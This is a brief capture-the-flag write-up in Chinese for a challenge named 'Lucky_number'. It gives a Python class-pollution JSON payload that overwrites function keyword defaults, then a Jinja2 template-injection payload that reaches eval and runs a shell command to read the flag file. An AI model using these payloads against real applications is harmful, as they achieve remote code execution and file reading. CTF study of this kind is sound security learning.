### Lucky_number

---

> python 原型链

根据要求传入json，

```json
{
    "__init__":{
        "__globals__":{
            "heaven":{
                "create":{
                    "__kwdefaults__":{
                        "lucky_number":5346,
                        "confirm":"true"
                    }
                }
            }
        }
    }
}
```

然后进入模板注入界面

```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /f*').read()")}}{% endif %}{% endfor %}

```

